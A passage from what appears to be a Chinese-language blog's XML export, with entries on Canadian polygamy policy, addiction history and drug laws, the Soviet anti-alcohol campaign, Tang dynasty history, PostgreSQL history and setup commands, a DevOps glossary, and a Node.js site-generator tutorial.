（阿富汗移民），在他的第二任妻子和儿子的帮助下，杀了他们的其他孩子以及他的第一任妻子；还有一部分是因为在 2015 年由前保守党政府推动通过的“对野蛮文化习俗的零容忍法案（the Zero Tolerance for Barbaric Cultural Practices）”。该法案重申，一夫多妻制是一种犯罪，是“野蛮的行径”，诸如毁损生殖器和强迫儿童婚姻，都被批评为一种伊斯兰腔调。这些舆论引起了加拿大人的共鸣，加拿大人认为穆斯林不共享他们的价值观。 加拿大五大移民来源国中三个国家中，对于穆斯林来说，一夫多妻是合法的（菲律宾、伊朗和巴基斯坦）。在另一个国家（印度）一夫多妻也是相当普遍的。加拿大政府已经建议联合国难民署（UNHCR）—— 联合国处理难民事务的机构，不得将一夫多妻婚姻中的任何难民安置到加拿大。但是加拿大的边境管理人员只能根据很少的信息做出迅速的判断。对他们来说，一个行之有效的识别一夫多妻者的方法是，男性移民通常是自愿提供信息的或者是想同时带一个以上的女性。这样更容易把他们分别为佣人或亲戚（Shafia 女士是作为仆人一起带来，被称为孩子的姑姑）。 安大略南亚法律事务所的 Shalini Konanur ：“通常来说反映一夫多妻关系的第一个关键信号是家庭暴力的情况”，她致力于帮助妇女脱离人际暴力危险。如果强制执行该政策，受影响最严重的仍然是妇女，她们会被关在边界，被遗弃在自己的祖国，或者在加拿大被虐待，因为害怕被发现和驱逐出境。 Martha Bailey，金斯顿女王大学家庭法专家，“一夫多妻制有时会成为一个问题，因为多个妻子寻求遗产继承权”。Susan Drummond，一位法律人类学家，在 2009 年说，应该禁止一夫多妻制，因为加拿大有其他法律和条例来保护妇女和未成年人。 加拿大总理贾斯廷·特鲁多承诺对加拿大的法律进行分析，以确定它们是否危害妇女。这是一个很好的姿态。但他也应该看看法律在实践中是如何运作的。 扩展阅读 数据可视化（十）公共数据源列表 参考文献​- 气候、概率和情绪]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[嗑药简史：行为成瘾]]></title>
    <url>%2F2018%2F01%2F07%2FAddiction-Decision-Behavior%2F</url>
    <content type="text"><![CDATA[摘要待编辑 构思体育赛事与兴奋剂色情业（黄） 数据暂缺 博彩业（赌） 博彩业情况参考政府彩票销售数据 死于嗑药的皇帝们 唐太宗（西域长生药）：51岁 明嘉靖帝（道士丹药）： 专制主义 自恋的暴君 | 原创 2017-07-10 范海辛 独立作家 现代 学生：提高学习成绩学生使用药物以求提高学习成绩。根据美国 NIDA 的追踪调查数据，2017年全美约 2.4% 的大学生使用利他林（Ritalin，中枢神经兴奋剂）。约 9.9% 的大学生使用阿得拉（Adderall，一种治疗注意力缺失/多动症的药物）。（数据来源 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017) ） 扩展阅读：《嗑药简史》嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录） NIDA: 美国青年人群药物滥用情况(2016~2017) 医学常识| NIH 情绪健康检查单 参考文献 测试：你以为你热爱工作，其实可能是一种成瘾 | 孤独的人更容易成瘾]]></content>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[嗑药简史：瘾品管制背后的情与法]]></title>
    <url>%2F2018%2F01%2F07%2FAddiction-Decision-Law%2F</url>
    <content type="text"><![CDATA[摘要 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 严刑峻法：瘾品管制与刑法量刑世界各国法律对于非法制售瘾品的处罚都比较严格。例如极易成瘾的海洛因，由于成瘾后生理危害大而且极难戒治，量刑尤为严格。 中国大陆：根据《中华人民共和国刑法》，贩卖毒品（含海洛因）50克或以上，即可判处死刑。 英国：输入（importation）海洛因500克以上，处10年以上监禁；5公斤以上，处14年以上监禁；最高刑为终身监禁。 美国：较为宽松。基本罪级为16级，2年左右监禁；100公斤海洛因（或者500公斤可卡因），处20年监禁。 中国香港：根据《危险药物条例》，贩运危险药物人士最高可被判终身监禁及罚款500万港元。 中国台湾：根据《毒品危害防制条例》，海洛因、吗啡、鸦片、古柯碱及其相类制品，为一级毒品。制造、运输、贩卖处死刑或无期徒刑。 中国新加坡：根据新加坡法律，未经许可而进、出口多于15克的海洛因，或制造任何数量之海洛因者，一经定罪，一律判处死刑。 马来西亚：根据马来西亚《毒品条列》，任何人贩运多于15克的毒品（如海洛因、吗啡、鸦片等）如罪成，即唯一死刑，处绞死。 海洛因按照纯度而分成4级，一号和二号海洛因实际指吗啡或吗啡盐类，三号海洛因是将盐酸吗啡制成二乙酰吗啡后，再添加大量的稀释剂而制成的，二乙酰吗啡和单乙酰吗啡总含量一般为25%至45%。四号海洛因是在盐酸吗啡经乙酰化反应后不稀释，而是提纯，沉淀，干燥。最终产品二乙酰吗啡含量一般在80%以上，最高可达99%。英国判例通常按100%纯度折算量刑，美国整体量刑较轻，一般主要考虑重量。 但是纵观各国历史，并不是所有瘾品都可以单纯在法律层面加以限制，还需要考虑社会习惯和民众心理。 戈尔巴乔夫的禁酒运动 前苏联发生的是似乎不可抗拒的历史力量与似乎不可移动的客观事实的冲撞，历史力量是合理化的改革，客观事实是俄罗斯的酗酒现象，结果是后者胜利。—— 《上瘾五百年: 烟、酒、咖啡和鸦片的历史》 长久以来俄罗斯民族都有着豪饮烈酒的习惯。自沙皇政府以降，到后来的布尔什维克掌握政权，都曾经试图改变民间酗酒的风俗。1985年，戈尔巴乔夫成为苏联最高领导人。这位年仅54岁的最高统帅又一次开始了禁酒运动。 苏共中央委员会通过决议《关于克服酗酒的管理办法》 苏联部长会议通过第410号决议《关于克服酗酒以及禁止私自酿酒的管理办法》 最高苏维埃主席团发布《关于加强同酗酒的斗争以及禁止私自酿酒》 上述决议为反酗酒斗争赋予全权，执行规模空前之大。其中包括经济调控（显著缩减酒类饮品产量、限制售酒地点、控制售酒时间段— 只允许 14：00 - 19：00 售卖等），行政问责（政府、卫生和工会系统之外，苏联中央监察委员会主席亲自领衔组织反酗酒纠察队），刑事处罚（强制戒酒机构）。一时之间，苏联的众多酒鬼们有如过街老鼠，被纠察队和警察满大街追，迫不得已纷纷转为 “地下党”。 然而，官方白酒数量的减少和违禁的严重后果都阻止不了俄罗斯人喝酒，反而促成了民间酿酒市场的兴旺。这个时期涌现出各种各样的家酿酒和私制伏特加，还有部分人开始喝古龙水、化学酒精（甲基化酒精和工业酒精）以及被称为“药品”的代酒——含有酒精的药酒。但是小作坊的产品质量缺乏保证，酒精中毒导致的死亡案例不断增加。 私酒全部经由地下黑市交易，根本不缴纳任何赋税，导致政府财政的重大损失。根据苏联部长会议主席雷日科夫统计，酒税收入减少了 670 亿卢布（当时的卢布高于美元），直接加剧了财政赤字。以至于 1987 年戈尔巴乔夫恢复白酒的产量也于事无补，因为此时的私酒已经比官方的白酒售价便宜 30% 以上。 许多俄罗斯人认为喝酒是斯拉夫民族的文化特色，简直视之为自己生来就应享有的权利。 苏共高层发起禁酒运动的一个重要依据是“社会主义的建设者”的道德价值观衰退，对于劳动的热情锐减导致经济不振。随着禁酒运动的深入，苏联国内舆情汹涌，民众的反抗怒火很快就指向“体制”。 数以百万计的普通百姓为了排遣单调枯燥的生活而喝酒，指挥他们的人却要他们保持清醒努力工作。但努力的结果是对谁有利呢？但努力的结果是对谁有利呢？拿到工资能买到必需的消费品吗？—— 商店的货架都是空的。上级承诺的体育设施和文化福利又在哪里？生活根本索然无味。—— 《上瘾五百年: 烟、酒、咖啡和鸦片的历史》 首先，对于民众来说最明显的是伏特加价格的急剧上升。3-4卢布好日子已经一去不复返了，伏特加酒的价格迅速上涨。到 1986 年，最便宜、最劣质的伏特加也要卖 9 卢布 10 戈比。整个苏联，各个售酒点的门前都排起了长长的队伍。 其次，在倒卖私酒的成员中包括很多军队和地方的党政机关。官僚们对苏共中央的指示置之不理，专心经营着地下室里的酿造厂业务，大发横财。禁酒运动招致表里不一、行事不公的指责。同时，戈尔巴乔夫采用高压式、强硬地推行禁酒，措施粗糙，急于求成。经统计，在1986年进过戒酒学习班的苏联公民超过 400 万人，被送进戒酒所接受15天强制戒酒的人超过了900万。当时的苏联经济和政府本来就已经处于停滞、混乱之中，社会矛盾尖锐。突如袭来的禁酒运动，无疑是给苏共自己培养了近千万人的政治反对派。当时民间流行的各种讽刺小曲儿，甚至开始有人说，老实而清醒的人卖劳力让既不老实又不清醒的人享受富裕，这等于是奴隶制度。 有过7卢布，有过8卢布。我们过去喝酒，现在也不会停。如果价格还要再涨，我们就会像波兰人那样。（暗指 1981 年波兰独立工会的反抗运动） 六点公鸡唱歌，八点普加乔娃（著名女歌手），商店关门到两点，你问钥匙在哪？在戈尔巴乔夫的腰包。 最后，绝对禁酒的方案从人体科学角度看也做不到。第一，苏联大部分地区冬季漫长长，温度极低，喝酒可以帮助人们抵御寒冷，特别是对于那些缺乏足够供暖条件的底层民众来说，是生活的必需品。第二，长期大量摄入酒精会影响中枢神经系统，逐渐形成耐受性与心理依赖。突然减少或中断酒精摄入会出现酒精戒断症候群（Alcohol withdrawal syndrome） ：原本被抑制的神经系统过度活化，心理与生理上会因此产生各种难以忍受的痛苦，例如：肠胃不适、恶心和呕吐、全身疲倦、易累、焦虑与烦躁不安等，甚至全身性痉挛、意识障碍，以及妄想、幻觉等症状。 禁酒运动坚持两年之后，戈尔巴乔夫只好在一片漫骂声中草草收场。 扩展阅读：《嗑药简史》嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)参考文献 《应该让毒品的使用合法化吗》| 盖瑞·贝克 （1992年诺贝尔经济学奖） 了解酗酒与酒瘾]]></content>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于唐史]]></title>
    <url>%2F2018%2F01%2F07%2FHistory-Tang%2F</url>
    <content type="text"><![CDATA[摘要 重要文献 《大唐创业起居注》 《大唐三藏法师西域记》 《资治通鉴》摘要 《资治通鉴·唐纪八·卷第一百九十二》益州大都督窦轨奏称獠反，请发兵讨之。上曰：“獠依阻山林，时出鼠窃，乃其常俗；牧守苟能抚以恩信，自然帅服，安可轻动干戈，渔猎其民，比之禽兽，岂为民父母之意邪！” 《资治通鉴·唐纪二十三·卷第二百七》太后信重内史梁文惠公狄仁杰，群臣莫及，常谓之国老而不名。太后尝问仁杰：“朕欲得一佳士用之，谁可者？”仁杰曰：“未审陛下欲何所用之?”太后曰：“欲用为将相。”仁杰对曰：“文学蕴藉，则苏味道、李峤固其选矣。必欲取其卓荦奇才，则有荆州长史张柬之，其人虽老，宰相才也。”太后擢张柬之为洛州司马。数日，又问仁杰，对曰：“前荐柬之，尚未用也。”太后曰：“已迁矣。”对曰：“臣所荐者可为宰相，非司马也。” 乃迁秋官侍郎；久之，卒用为相。 仁杰又尝荐夏官侍郎姚元崇、监察御史曲阿桓彦范、太州刺史敬晖等数十人，率为名臣。或谓仁杰曰：“天下桃李，悉在公门矣。”仁杰曰：“荐贤为国，非为私也。” 两脚狐《资治通鉴· ·唐纪二十三·卷第二百七》秋，七月，丙戌，以神都副留守杨再思为内史。再思为相，专以谄媚取容。司礼少卿张同休，易之之兄也，尝召公卿宴集，酒酣，戏再思曰：“杨再思面似高丽。” 再思欣然，即剪纸帖巾，反批紫袍，为高丽舞，举坐大笑。时人或誉张宗昌之美曰：“六郎面似莲花。”再思独曰：“不然。”昌宗问其故，再思曰：“乃莲花似六郎耳。” “左补阙戴令言作《两脚野狐赋》以讥讽之，再思闻之怒。”—— 《旧唐书·杨再思传》]]></content>
      <tags>
        <tag>History</tag>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：PostgreSQL 数据库]]></title>
    <url>%2F2018%2F01%2F03%2FOpenSource-DB-PostgreSQL%2F</url>
    <content type="text"><![CDATA[摘要 PostgreSQL 的时代到来了吗 PostgreSQL 简史 PostgreSQL ABC PostgreSQL是对象-关系型数据库，BSD 许可证。拼读为”post-gress-Q-L”。 PostgreSQL 的时代到来了吗 ? 作者： Tony Baer 原文： Has the time finally come for PostgreSQL?（有删节） 近30年来 PostgreSQL 无疑是您从未听说过的、最常见的开源 SQL 数据库。PostgreSQL 经常身居幕后：从 EnterpriseDB 到 Amazon Redshift 、Greenplum、Netezza 及其他许多商业数据库产品。 最近在许多商业产品的推动下，PostgreSQL 逐渐走向前台。大约十年前 EnterpriseDB 打开了潘多拉的盒子 —— 作为商业支持平台提供 Oracle 的替代品。特别是最近一段时间，云服务商提供了一系列托管产品：从 Amazon Wed Services 开始, 支持 PostgreSQL 作为其托管关系数据库服务 (Relational Database Service，RDS) 之一。 过去一年 AWS 和它的竞争对手将 PostgreSQL 的市场前景提升了一个等级。AWS 推出了兼容 PostgreSQL 的原生云数据库平台 Amazon Aurora ，作为回应 Microsoft 和 Google 推出了 Azure Database for PostgreSQL 和 Cloud SQL for PostgreSQL 解决方案。 Mark Porter（马克·波特，Amazon Aurora PostgreSQL 和 Amazon RDS for PostgreSQL 主管） 不得不通过一些花哨的方法表达 AWS 对开源社区的支持，例如修复 Bug、提供免费测试帐户和其他形式的财政支助。PostgreSQL 在 AWS 上的实现不是开源的, 因为它是为 AWS 自身的云基础结构而设计。 PostgreSQL 虽然是聚焦于事务型数据库的开源项目, 但是许多基于它的商业产品都是大规模并行处理数据仓库（Massively Parallel Processing，MPP）。出于这个原因, Greenplums，Netezzas 和Redshifts 创建了自己的开源 forks 项目, 甚至添加像 columnar tables 这样的基本功能。 PostgreSQL 的一个常见主题是支持企业级负载的开源关系数据库。关于这一点，竞争者包括 MySQL 和 MariaDB , 但仍然存在差异, PostgreSQL 支持更复杂的 SQL 函数和数据类型, 包括数组（arrays）, 连接（joins）和视图（Window Functions）等等。 另一个原因是出现了“replace Oracle”的口号, PL/pgSQL 的设计非常类似 Oracle PL/SQL。这正是EnterpriseDB 多年以来一直提倡的，同时获得了 美国金融业监管局(Financial Industry Regulatory Authority，FINRA) 的支持。FINRA 将大约 650 个 Oracle 实例迁移入云（ Amazon RDS for PostgreSQL），作为一个更大战略的一部分, 将其整个部署在 IT 基础设施上的业务迁移到 AWS。根据 FINRA 首席开发者 Steve Downs 的说法，对于 Oracle DBA 而言，在 PostgreSQL 中使用诸如对象/关系映射（object/relational mappings）、存储过程（stored procedures）以及利用视图（view）支持复杂查询的功能，给人一种似曾相识的感觉。 然而, 作为两种不同的数据（包括 SQL 实现）PostgreSQL 和 Oracle 之间毕竟存在显著差异。例如数据库如何处理数字和可变字符字段、同义词、复制 (replication，PostgreSQL 不像 Oracle 那样成熟 ) 以及实例化视图刷新等等。 PostgreSQL 有它独特的优势，即作为第三方寻求自主数据库产品的开源平台。重要的是, 去年秋季发布的最新 10.0 版本（2017年11月09日）, 解决了在 Oracle 或 SQL Server 产品中被视为理所当然的功能，包括声明式表分区（declarative table partitioning）、改进后的复制功能（replication）, 发布/订阅（publish/subscribe）、仲裁提交（quorum commits，对于云部署可能非常有用)。 总之，PostgreSQL 还有很多需要追赶的领域, Oracle 或 SQL Server 用户也仍然有理由继续使用他们的平台。大部分的差异将体现在数据库的实施, 而不是一些具体的功能特性。这种差异将主要体现在数据库弹性、自动化、基础架构选型以及云计算的规模等方面。有了 AWS、Azure 和 Google Cloud 的加持（非常值得注意的一个信号），若干年后 PostgreSQL 可能最终走出阴影。 PostgreSQL 简史PostgreSQL 开始于 UC Berkeley 的 Ingres 计划，经历了长时间的演变。 Ingres 计划的领导者 Michael Stonebraker（迈克尔·斯通布雷克，2015 年图灵奖得主，目前是麻省理工学院兼职教授）在 1982 年离开 Berkeley 进入商业公司 Ingres，1985年又返回 Berkeley 开始新项目 Postgres 。Postgres 项目组从1986年开始发表了一些描述系统基本原理的论文并发行了版本1、2、3 、4，到1993年就有大量的用户存在了。尽管 Postgres计划正式的终止了，BSD许可证却使开发者可以获得副本并进一步开发系统。1994年，两个 UC Berkeley 的研究生 Andrew Yu 和 Jolly Chen 增加了一个SQL语言解释器来替代早先的基于 Ingres 的 QUEL 系统，创建了 Postgres95。 1996年重命名为：PostgreSQL。（版本 6.0 ） 2000年，前 Red Hat 投资者筹组了一间名为Great Bridge的公司来商业化PostgreSQL，以和其他商用数据库厂商竞争。2001年末，Great Bridge 因市场原因终止营运。2001年，Command Prompt, Inc. 发布了最老牌的PostgreSQL 商业软件 Mammoth PostgreSQL，并提供开发者赞助和贡献 PL/Perl、PL/php、维护 PostgreSQL Build Farm 等。 2005年1月 ，Pervasive Software 宣布参与社区及商业支持，直到 2006 年 7 月退出。2005年1月19日，版本 8.0 发行。自 8.0 后，PostgreSQL以原生（Native）的方式，运行于Windows系统。2006年6月，Solaris 10 包含 PostgreSQL一起发布。 2012年09月10日，PostgreSQL 发布 9.2 版本，主要在性能方面的提升，也包括一些新的 SQL 特性。2016年10月27日，PostgreSQL 发布 9.6.1 版本。2017年11月09日，PostgreSQL 发布 10.1 版本。 ABC12345678910111213141516171819202122232425262728293031323334353637383940# install$ brew install postgresql# version$ pg_ctl -Vpg_ctl (PostgreSQL) 10.1# initdb -- 创建一个新的PostgreSQL数据库簇（cluster）,单个服务端实例管理的多个数据库的集合。# 创建数据库数据的宿主目录，生成共享的系统表 （不属于任何特定数据库的表）和创建template1 和postgres数据库$ initdb /Users/yanrui/Data/TestPG# start$ pg_ctl -D /Users/yanrui/Data/TestPG startwaiting for server to start....2018-01-03 14:13:17.005 CST [37621] LOG: listening on IPv4 address "127.0.0.1", port 54322018-01-03 14:13:17.005 CST [37621] LOG: listening on IPv6 address "::1", port 54322018-01-03 14:13:17.006 CST [37621] LOG: listening on Unix socket "/tmp/.s.PGSQL.5432"2018-01-03 14:13:17.048 CST [37623] LOG: database system was shut down at 2018-01-03 14:11:30 CST2018-01-03 14:13:17.066 CST [37621] LOG: database system is ready to accept connections doneserver started# port listenbash-3.2$ netstat -an | grep LISTEN tcp6 0 0 ::1.5432 *.* LISTEN# createdbbash-3.2$ createdb -O[owner] test_db# default [当前登录系统用户名]bash-3.2$ psql2018-01-03 18:14:37.537 CST [45864] FATAL: database "yanrui" does not existpsql: FATAL: database "yanrui" does not existYou have new mail in /var/mail/yanrui# login inbash-3.2$ psql test_dbpsql (10.1)Type "help" for help.# log outtest_db=# \q (Ctrl+D)# 卸载$ brew uninstall postgres# 开机$ launchctl unload -w ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist$ rm -rf ~/Library/LaunchAgents/homebrew.mxcl.postgresql.plist Architecture OverView 扩展阅读 Data Model Generation for PostgreSQL How FINRA is Migrating to Postgres 参考文献 PostgreSQL新手入门 Postgres full-text search is Good Enough! | JULY 13,2015 Showdown: MySQL 8 vs PostgreSQL 10 兼容 PostgreSQL 的 Amazon Aurora 已在 AWS GovCloud（美国）区域推出 | Jun 14,2018 Amazon Aurora 产品信息]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Autobiography:我的2018年度盘点]]></title>
    <url>%2F2018%2F01%2F01%2FCheck2018%2F</url>
    <content type="text"><![CDATA[摘要 Core Topics: Machine Learning 一、Core Topics Hacker: Creativity &amp; Freedom、Spider、Intellectual Property Law Machine Learning：Mathmetics &amp; Algorithms、TensorFlow、Computer Vision、Deep Learning Planing: Golang Advanced Skills 二、年度成果 三、过程改进 &amp; 方法论 Machine Learning | 机器学习与人工智能 黑客与技术、产业及其精神世界 DevOps 漫谈：从作坊到工厂的寓言故事 我的写作工具链（v4-201801） 知识产权法（Intellectual Property Law） 数学常识| 如何度量复杂性 IT 工程师养生指南 医学常识| NIH 情绪健康检查单 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 四、Information Technology DevOps 漫谈：开源分布式跟踪系统 OpenCensus DevOps 漫谈：分布式追踪系统标准体系 DevOps 漫谈：从作坊到工厂的寓言故事 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 PriviewMachine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 Machine Learning:人工智能媒体报道集 Cyber-Security: 黑客与技术、产业及其精神世界 DevOps 漫谈：Docker DevOps 漫谈：基础设施部署和配置管理 2018 年度 Docker 用户报告 - Sysdig Edition 数据可视化（五）基于网络爬虫制作可视化图表 From Better To Advanced | Go 语言开发入门书单 数据可视化（十）公共数据源列表 开源技术架构漫谈：PostgreSQL 数据库 动态追踪技术(五)：Welcome DTrace for Linux PreviewHow Linux Works(四)：Network 谁是王者：macOS vs Linux Kernels ？ 五、Economist Preview《嗑药简史：行为成瘾》 嗑药简史（四）：咖啡上瘾，喝还是不喝？ The Economist 2017年度推荐书单 经济学人：加拿大的一夫多妻问题 —— 摩门教、移民和穆斯林 六、Culture &amp; History 古典音乐低俗史 Preview关于唐史 Preview唐史|狄仁杰 红楼故事：康熙的秘密情报系统 谁是王者：macOS vs Linux Kernels ？ 品牌运营 1、RiboseYim’s Blog(riboseyim.github.io) 2、RiboseYim’s Twitter 3、RiboseYim’s Telegram]]></content>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux-Perf-WordBook]]></title>
    <url>%2F2017%2F12%2F23%2FLinux-Perf-WordBook%2F</url>
    <content type="text"><![CDATA[摘要 dynamic tracing，动态追踪技术 kk 指标IOPS 每秒的I/O操作数 吞吐量 评价执行速率。数据传输：字节／秒或比特／秒数据库：秒操作数，秒业务数 延迟 描述操作里等待服务的时间。某些情况下等同于响应时间。 使用率 给定时间区间内，资源的繁忙程度。如内存使用率。非空闲时间（Brendan定义） 1.基于时间： U=B/TU是使用率，B是T时间内系统繁忙时间，T是观测周期。 2.基于容量： observer effect ,观测者效应：指标的获取不是免费的。 响应时间 一次操作完成的时间。包括用于等待和服务的时间。 饱和度 指的是某一资源无法满足服务的排队工作量。随着工作量增加而对资源的请求超过资源所能处理的程度。 瓶颈 限制性资源。 工作负载 系统的输入、输出对系统所施加的负载叫工作负载。如数据库的工作负载就是客户端发出的请求和指令。 缓存 用于复制或存储一定量数据的高速存储区域。ps:相对概念。只要存在高低速差，即可视为广义缓存？ 1.冷：填充的数据为空，或填充无用的数据，命中率为02.热：填充的都是常用数据3.温：命中率还没有达到理想的高度4.热度： PProfiling 剖析 Perturbation 扰动 同义词： ROI 投资回报率 性能技术取决于投资回报率！横跨大西洋连接纽约交易所和伦敦交易所的光缆，预算3亿美金，用以减少6ms的传输时延 SUT,system under test 受测系统 方法论分类：信息收集、观测分析、容量规划、统计分析、调优、实验分析 USE方法 （utilization,saturation,errors）for(资源;所有资源;i++){ 1.出现错误？ 2.使用率高？ 3.饱和？} Scheduling Algorithm 调度算法 Code Name 名称 说明 RR round－robin 轮询调度 单纯依次请求真实服务器。均等分发 WRR weighted round-robin 加权轮询调度 引入加权值来控制分发比率。 LC least-connection 最小连接调度 将新的请求连接到当前连接数最少的服务器 WLC weighted least-connection 加权最小连接调度 （连接数＋1）／加权值。 SED shortest expected delay 最短预期延时调度 选择响应速度最快的那台服务器，选择状态ESTABLISHED的连接数最少的服务器。与WLC类似，但WLC会把TIME_WAIT或FIN_WAIT的连接数计算在最小因素中 NQ never queue 不排队调度 最优先选择连接数为0的服务器 SH source hashing 源地址散列调度 对发出请求的IP地址计算散列值 DH destination hashing 目标地址散列调度 对需要接收请求的目标地址计算散列值 LBLC locality-based least-connection 基于局部性的最小连接 在连接数没有超过加权值指定的值时，将选择同一台服务器 LBLCR locality-based least-connection with replication 带复制的基于局部性最小连接 当所有服务器的连结数都超过加权值指定的值时，将选择连接数最少的那台服务器 DevOps-WordBookAAvailability () [可用性]1系统停止的可能性。 Algorithm()[算法] Scheduling Algorithm 调度算法 BBottleneck () [瓶颈]1阻碍系统整体性能提升的地方。 CCDN (Content Delivery Network) [内容分发网络]1从散布在全世界的缓存服务器中，选择离客户端较近的服务器来发送信息，据此实现性能的提升 DDC (Data Center) [数据中心]1容纳服务器设备。配备空调，冗余电源。配备火灾、地震等应急措施。 Daemon () [守护程序]1在后台持续运行并发挥作用。 EEnvironment () [环境]12Production Environment 生产环境Staging Environment 准生产环境 FFailover () [故障转移]12在冗余系统中，活动节点（Active Node）停止时，自动切换到备用节点（Backup Node）.如果不是自动切换，而是手动，通常叫作Switchover. Failback ()[故障恢复] File System () [文件系统]12分类：Memory File System:建立在内存中的文件系统 G** () []12 HHealth Check () [健康检查]12确认检查对象的状态是否正常。例如：确认服务器是否能响应ping,是否能应答HTTP等。 I** () []12 J** () []12 KKeepalived () [内容分发网络]1http://www.keepalived.org LLVS (Linux Virtual Server) [Linux虚拟服务器]12原伟项目名，旨在搭建具有可扩展性的、实用性高的系统。http://www.linuxvirtualserver.org Load Balancer () [负载均衡器]12位于客户端和服务器之间，将客户端的请求分散到后端的多台服务器。Load［负载］大致力可分为“CPU负载”和“IO负载”。详见：http://www.jianshu.com/p/db8e8a2884ef Latency () [延迟]1通常指数据投递完成所花费的时间。 M** () []12 NNIC (Network Interface Card) [网络接口卡，网卡]1网络接口的总称 Netfilter12Linux内核中操作网络数据包所需的协议框架。实现分组过滤的iptables和负载均衡的IPVS也应用了Netfilter协议。 OOSI (Open Systems Interconnection) [参考模型]12345分为七层（Layer）框架，例如：第七层：应用层。HTTP及SMT等协议第四层：传输层。TCP及UDP第三层：网络层。IP、ARP及ICMP第二层：数据链路层。以太网等 OSS (OpenSource Software) [开源软件]12345```## P**Proxy** () [代理] Transparent Proxy:透明代理 123## Q**** () [] 1234## R**Redundancy** () [冗余] 将系统的构成要素配置多个，即使其中一个发生故障而停止运作，也可以切换到备用设备以使服务不停止。1**Resource** () [资源] 指CPU,内存，磁盘空间等1234## S**Scalability** () [可扩展性] 随着用户的增多以及规模的扩大，在某种程度上扩展系统以加强应对的能力。Scale-out:横向扩展。例如：将服务分摊到多台服务器Scale-up:纵向扩展。 例如：提升单个服务器性能12**SPO** (Single Point of Failure) [单点故障] 若此处出现问题，就会令整个系统停止，即系统要害。12345## T**Throughput** () [吞吐量] 代表单位时间的传送量。例如：大巴车和小汽车。1234## U**** () [] 1234## V**VIP** (Virtual IP Address) [虚拟IP地址] 浮动分配给某项服务或功能的IP地址。例如负载均衡器中接收客户端请求的IP地址。123## W**** () [] 1234## X**** () [] 1234## Y**** () [] 1234## Z**** () [] ```]]></content>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:基于Node.js构建自定义代码生成器]]></title>
    <url>%2F2017%2F12%2F21%2FLanguage-Auto-Generator%2F</url>
    <content type="text"><![CDATA[摘要在真实的软件开发过程中，无论使用何种编程开发语言，都不可避免的会遇到代码重复的问题。如何处理重复的问题，可以选择情怀（手动再敲一遍），也可以选择 Copy-to-Copy ，或者选择代码生成器。正如在之前的文章 我的写作工具链 中，我介绍过一种 Blog 生成器 hexo ，可以将 Markdown 格式的内容自动生成方便发布的 HTML 格式。本文将还原 hexo 的运行原理，为解决类似问题提供一些参考思路。 示例：通过 Markdown 文件声明模板（源代码），通过脚本生成 HTML 文件（目标代码），并预览代码生成效果。 Step 1: 准备环境 (dependencies)开发语言 Node.js, 一个能够运行 JavaScript 的开放源代码、跨平台运行环境。 npm init — 初始化 root 目录 npm i -s live-server — 该模块支持本示例生成静态 HTML 站点，提供热部署能力 npm i -s nodemon — 该模块支持当文件变化自动执行重构任务 npm i -s concurrently — 该模块支持支持并发执行任务、脚本(scripts/tasks) npm i -s markdown-it — 该模块提供 Markdown 文件解析器 1234567891011121314151617mkdir project-generatormkdir project-generator/pagesmkdir project-generator/pages_metamkdir project-generator/jsmkdir project-generator/cssmkdir project-generator/imagesmkdir project-generator/build_scriptsmkdir project-generator/buildcd project-generatornpm init npm i -s concurrentlynpm i -s fsnpm i -s fs-extranpm i -s markdown-itnpm i -s live-server npm i -s nodemon Step 2: 准备元数据例如：pages/index.md12345# Home pageHello world![Link to another page](./other.html) 例如：pages_meta/index.json 用于存储一些需要的元数据（参数、固定内容等），JSON 文件格式方便后面调用。 12345678910111213&#123; "lang": "en", "title": "Index", 